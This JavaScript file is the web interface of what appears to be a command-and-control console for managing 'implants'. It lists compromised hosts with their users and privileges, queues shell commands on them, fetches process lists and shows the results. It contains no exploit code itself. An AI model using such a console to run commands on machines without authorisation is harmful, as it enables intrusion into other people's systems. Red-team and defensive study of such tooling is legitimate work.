/**
 * pages/agents.js — Agent list and agent detail / command console
 */

const PageAgents = (() => {

  let currentAgentId = null;

  async function render() {
    const el = document.getElementById('page-agents');
    el.innerHTML = `
      <div class="page-header">
        <div>
          <h1 class="page-title">Agents</h1>
          <p class="page-description">Registered implants and their runtime status</p>
        </div>
        <div class="page-actions">
          <button class="btn btn-secondary btn-sm" id="btn-refresh-agents">
            <svg width="13" height="13" viewBox="0 0 16 16" fill="currentColor"><path d="M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25l.001 3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z"/></svg>
            Refresh
          </button>
        </div>
      </div>

      <!-- Agent list panel -->
      <div class="panel" id="agents-list-panel">
        <div class="filter-bar">
          <div class="input-group" style="flex:1;min-width:200px">
            <svg class="input-group-icon" viewBox="0 0 16 16" fill="currentColor">
              <path d="M10.68 11.74a6 6 0 01-7.922-8.982 6 6 0 018.982 7.922l3.04 3.04a.749.749 0 01-.326 1.275.749.749 0 01-.734-.215l-3.04-3.04zM11.5 7a4.499 4.499 0 11-8.997 0A4.499 4.499 0 0111.5 7z"/>
            </svg>
            <input class="form-control" id="agent-search" placeholder="Search hostname, username, OS…" type="search">
          </div>
          <select class="form-control" id="agent-status-filter" style="width:140px">
            <option value="">All Status</option>
            <option value="online">Online</option>
            <option value="dormant">Dormant</option>
            <option value="offline">Offline</option>
            <option value="error">Error</option>
          </select>
          <span class="text-muted" style="font-size:var(--text-sm)" id="agent-count"></span>
        </div>
        <div class="panel-body no-pad" id="agents-table-container">
          <div style="padding:var(--space-10);text-align:center">
            <div class="loading-spinner" style="margin:auto"></div>
          </div>
        </div>
      </div>

      <!-- Agent detail panel (hidden until row clicked) -->
      <div id="agent-detail-section" style="display:none;margin-top:var(--space-4)">
        <div class="panel">
          <div class="panel-header">
            <div>
              <span class="panel-title" id="detail-title">Agent Detail</span>
              <span id="detail-status-badge" style="margin-left:var(--space-3)"></span>
            </div>
            <div class="panel-actions">
              <button class="btn btn-danger btn-sm" id="btn-remove-agent">Remove Agent</button>
              <button class="btn btn-ghost btn-sm" id="btn-close-detail">✕ Close</button>
            </div>
          </div>
          <div class="tabs">
            <div class="tab active" data-tab="info">Info</div>
            <div class="tab" data-tab="commands">Commands</div>
            <div class="tab" data-tab="processes">Processes</div>
          </div>
          <div id="detail-tab-content"></div>
        </div>
      </div>`;

    document.getElementById('btn-refresh-agents').addEventListener('click', loadAgents);
    document.getElementById('agent-search').addEventListener('input', filterTable);
    document.getElementById('agent-status-filter').addEventListener('change', filterTable);
    document.getElementById('btn-close-detail').addEventListener('click', closeDetail);
    document.getElementById('btn-remove-agent').addEventListener('click', removeAgent);

    document.querySelectorAll('#agent-detail-section .tab').forEach(tab => {
      tab.addEventListener('click', () => {
        document.querySelectorAll('#agent-detail-section .tab').forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        renderDetailTab(tab.dataset.tab);
      });
    });

    await loadAgents();
  }

  // ── Agent list ─────────────────────────────────────────────────────────────
  let allAgents = [];

  async function loadAgents() {
    try {
      const data = await API.agents.list();
      allAgents = data.agents || [];
      document.getElementById('agent-count').textContent = `${allAgents.length} agents`;
      renderTable(allAgents);
    } catch (e) {
      Toast.error('Failed to load agents', e.message);
    }
  }

  function filterTable() {
    const q      = document.getElementById('agent-search').value.toLowerCase();
    const status = document.getElementById('agent-status-filter').value;
    const filtered = allAgents.filter(a => {
      const matchQ = !q ||
        (a.hostname || '').toLowerCase().includes(q) ||
        (a.username || '').toLowerCase().includes(q) ||
        (a.os       || '').toLowerCase().includes(q) ||
        (a.id       || '').toLowerCase().includes(q);
      const matchS = !status || String(a.status).toLowerCase() === status;
      return matchQ && matchS;
    });
    renderTable(filtered);
  }

  function renderTable(agents) {
    const container = document.getElementById('agents-table-container');
    if (!agents.length) {
      container.innerHTML = `<div class="table-empty">
        <div class="table-empty-icon">🔍</div>
        <div class="table-empty-text">No agents found</div>
      </div>`;
      return;
    }

    const rows = agents.map(a => `
      <tr data-id="${escHtml(a.id || '')}" style="cursor:pointer">
        <td class="mono text-muted">${escHtml(shortId(a.id))}</td>
        <td class="primary">${escHtml(a.hostname || '—')}</td>
        <td>${escHtml(a.username || '—')}</td>
        <td>${escHtml(a.os || '—')}</td>
        <td>${statusBadge(a.status)}</td>
        <td class="text-muted">${escHtml(relTime(a.last_seen))}</td>
        <td>
          <button class="btn btn-secondary btn-xs" onclick="PageAgents.select('${escHtml(a.id || '')}')">
            View
          </button>
        </td>
      </tr>`).join('');

    container.innerHTML = `
      <div class="data-table-wrapper">
        <table class="data-table">
          <thead><tr>
            <th style="width:100px">ID</th>
            <th>Hostname</th>
            <th>Username</th>
            <th>OS</th>
            <th style="width:110px">Status</th>
            <th style="width:110px">Last Seen</th>
            <th style="width:70px"></th>
          </tr></thead>
          <tbody>${rows}</tbody>
        </table>
      </div>`;

    container.querySelectorAll('tr[data-id]').forEach(row => {
      row.addEventListener('click', e => {
        if (!e.target.closest('button')) select(row.dataset.id);
      });
    });
  }

  // ── Agent detail ───────────────────────────────────────────────────────────
  async function select(id) {
    currentAgentId = id;
    try {
      const a = await API.agents.get(id);
      const section = document.getElementById('agent-detail-section');
      section.style.display = 'block';
      document.getElementById('detail-title').textContent = a.hostname || id;
      document.getElementById('detail-status-badge').innerHTML = statusBadge(a.status);
      section.scrollIntoView({ behavior: 'smooth', block: 'start' });

      // Store agent data on section for tab rendering
      section.dataset.agent = JSON.stringify(a);
      const activeTab = document.querySelector('#agent-detail-section .tab.active');
      renderDetailTab(activeTab ? activeTab.dataset.tab : 'info');
    } catch (e) {
      Toast.error('Failed to load agent', e.message);
    }
  }

  function renderDetailTab(tab) {
    const section = document.getElementById('agent-detail-section');
    const a = JSON.parse(section.dataset.agent || '{}');
    const content = document.getElementById('detail-tab-content');

    switch (tab) {
      case 'info':     content.innerHTML = renderInfoTab(a); break;
      case 'commands': renderCommandsTab(content, a); break;
      case 'processes':renderProcessesTab(content, a); break;
    }
  }

  function renderInfoTab(a) {
    const fields = [
      { label: 'Agent ID',     value: a.id },
      { label: 'Hostname',     value: a.hostname },
      { label: 'Username',     value: a.username },
      { label: 'OS',           value: a.os },
      { label: 'Architecture', value: a.architecture },
      { label: 'Privileges',   value: a.privileges },
      { label: 'Process ID',   value: a.process_id },
      { label: 'First Contact',value: a.first_contact ? new Date(a.first_contact).toLocaleString() : '—' },
      { label: 'Last Seen',    value: a.last_seen ? new Date(a.last_seen).toLocaleString() : '—' },
      { label: 'Connections',  value: a.total_connections },
      { label: 'Cmds Executed',value: a.commands_executed },
      { label: 'Files Xferred',value: a.files_transferred },
    ];
    const cells = fields.map(f => `
      <div class="agent-field">
        <span class="agent-field-label">${escHtml(f.label)}</span>
        <span class="agent-field-value">${escHtml(String(f.value ?? '—'))}</span>
      </div>`).join('');
    return `<div class="agent-card">${cells}</div>`;
  }

  async function renderCommandsTab(content, a) {
    content.innerHTML = `
      <div style="padding:var(--space-5)">
        <!-- Send command -->
        <div class="panel" style="margin-bottom:var(--space-4)">
          <div class="panel-header"><span class="panel-title">Execute Command</span></div>
          <div class="panel-body">
            <div style="display:grid;gap:var(--space-3)">
              <div class="form-group">
                <label class="form-label">Command</label>
                <input class="form-control mono" id="cmd-input" placeholder="whoami, ipconfig, ls -la …" autocomplete="off">
              </div>
              <div style="display:grid;grid-template-columns:1fr 1fr;gap:var(--space-3)">
                <div class="form-group">
                  <label class="form-label">Working Directory</label>
                  <input class="form-control mono" id="cmd-workdir" placeholder="(optional)">
                </div>
                <div class="form-group">
                  <label class="form-label">Timeout (seconds)</label>
                  <input class="form-control" id="cmd-timeout" type="number" value="60" min="0" max="3600">
                </div>
              </div>
              <div style="display:flex;justify-content:flex-end;gap:var(--space-2)">
                <button class="btn btn-secondary btn-sm" id="btn-clear-queue">Clear Queue</button>
                <button class="btn btn-primary btn-sm" id="btn-send-cmd">
                  Send Command
                </button>
              </div>
            </div>
          </div>
        </div>

        <!-- Command history -->
        <div class="panel">
          <div class="panel-header">
            <span class="panel-title">Command History</span>
            <button class="btn btn-ghost btn-xs" id="btn-reload-history">↺ Reload</button>
          </div>
          <div id="cmd-history-body" class="panel-body no-pad">
            <div style="padding:var(--space-6);text-align:center">
              <div class="loading-spinner" style="margin:auto"></div>
            </div>
          </div>
        </div>
      </div>`;

    document.getElementById('btn-send-cmd').addEventListener('click', () => sendCommand(a.id));
    document.getElementById('btn-clear-queue').addEventListener('click', () => clearQueue(a.id));
    document.getElementById('btn-reload-history').addEventListener('click', () => loadHistory(a.id));
    document.getElementById('cmd-input').addEventListener('keydown', e => {
      if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendCommand(a.id); }
    });

    await loadHistory(a.id);
  }

  async function sendCommand(agentId) {
    const cmd     = document.getElementById('cmd-input').value.trim();
    const workdir = document.getElementById('cmd-workdir').value.trim();
    const timeout = parseInt(document.getElementById('cmd-timeout').value) || 60;

    if (!cmd) { Toast.warning('Empty command', 'Please enter a command'); return; }

    const btn = document.getElementById('btn-send-cmd');
    btn.disabled = true;
    btn.textContent = 'Sending…';
    try {
      await API.commands.execute(agentId, cmd, {
        working_dir: workdir || undefined,
        timeout,
        operation_type: 'execute',
      });
      Toast.success('Command queued', cmd);
      document.getElementById('cmd-input').value = '';
      await loadHistory(agentId);
    } catch (e) {
      Toast.error('Command failed', e.message);
    } finally {
      btn.disabled = false;
      btn.textContent = 'Send Command';
    }
  }

  async function clearQueue(agentId) {
    try {
      await API.commands.clearQueue(agentId);
      Toast.success('Queue cleared');
      await loadHistory(agentId);
    } catch (e) {
      Toast.error('Failed to clear queue', e.message);
    }
  }

  async function loadHistory(agentId) {
    const body = document.getElementById('cmd-history-body');
    if (!body) return;
    try {
      const data = await API.commands.history(agentId, '?limit=50');
      const cmds = data.commands || [];
      if (!cmds.length) {
        body.innerHTML = `<div class="table-empty">
          <div class="table-empty-icon">📋</div>
          <div class="table-empty-text">No commands yet</div>
        </div>`;
        return;
      }
      const rows = cmds.map(c => `
        <tr>
          <td class="mono text-muted">${escHtml(shortId(c.id))}</td>
          <td class="primary mono" style="max-width:280px;overflow:hidden;text-overflow:ellipsis">${escHtml(c.command || c.operation_type || '—')}</td>
          <td>${statusBadge(c.status)}</td>
          <td class="text-muted">${escHtml(relTime(c.created_at))}</td>
          <td>
            <button class="btn btn-ghost btn-xs" onclick="PageAgents.viewResult('${escHtml(c.id)}')">View</button>
          </td>
        </tr>`).join('');
      body.innerHTML = `
        <div class="data-table-wrapper">
          <table class="data-table">
            <thead><tr><th>ID</th><th>Command</th><th>Status</th><th>Time</th><th></th></tr></thead>
            <tbody>${rows}</tbody>
          </table>
        </div>`;
    } catch (e) {
      body.innerHTML = `<div class="table-empty"><div class="table-empty-text text-danger">Failed to load history</div></div>`;
    }
  }

  async function renderProcessesTab(content, a) {
    content.innerHTML = `
      <div style="padding:var(--space-5)">
        <div class="panel">
          <div class="panel-header">
            <span class="panel-title">Process List</span>
            <button class="btn btn-primary btn-sm" id="btn-list-processes">Fetch Processes</button>
          </div>
          <div id="process-output" class="panel-body no-pad">
            <div class="table-empty">
              <div class="table-empty-icon">⚙️</div>
              <div class="table-empty-text">Click "Fetch Processes" to list running processes</div>
            </div>
          </div>
        </div>
      </div>`;

    document.getElementById('btn-list-processes').addEventListener('click', async () => {
      const btn = document.getElementById('btn-list-processes');
      btn.disabled = true;
      btn.textContent = 'Fetching…';
      try {
        await API.processes.list(a.id);
        Toast.info('Process list queued', 'Result will appear in command history');
      } catch (e) {
        Toast.error('Failed', e.message);
      } finally {
        btn.disabled = false;
        btn.textContent = 'Fetch Processes';
      }
    });
  }

  function closeDetail() {
    document.getElementById('agent-detail-section').style.display = 'none';
    currentAgentId = null;
  }

  async function removeAgent() {
    if (!currentAgentId) return;
    if (!confirm(`Remove agent ${currentAgentId}? This cannot be undone.`)) return;
    try {
      await API.agents.remove(currentAgentId);
      Toast.success('Agent removed');
      closeDetail();
      await loadAgents();
    } catch (e) {
      Toast.error('Failed to remove agent', e.message);
    }
  }

  async function viewResult(cmdId) {
    try {
      const cmd = await API.commands.status(cmdId);
      const output = cmd.output || '(no output)';
      const err    = cmd.error  || '';
      Modal.create({
        title: `Command Result — ${shortId(cmdId)}`,
        body: `
          <div style="margin-bottom:var(--space-3)">
            <span class="badge badge-gray" style="margin-right:var(--space-2)">Status</span>
            ${statusBadge(cmd.status)}
            ${cmd.exit_code !== undefined ? `<span class="badge badge-gray" style="margin-left:var(--space-2)">Exit ${cmd.exit_code}</span>` : ''}
          </div>
          <div class="terminal">
            <div class="terminal-header">
              <div class="terminal-dots">
                <div class="terminal-dot terminal-dot-r"></div>
                <div class="terminal-dot terminal-dot-y"></div>
                <div class="terminal-dot terminal-dot-g"></div>
              </div>
              <div class="terminal-title">${escHtml(cmd.command || '')}</div>
            </div>
            <div class="terminal-body">${escHtml(output)}${err ? '\n\n[stderr]\n' + escHtml(err) : ''}</div>
          </div>`,
      });
    } catch (e) {
      Toast.error('Failed to load result', e.message);
    }
  }

  return { render, select, viewResult };
})();
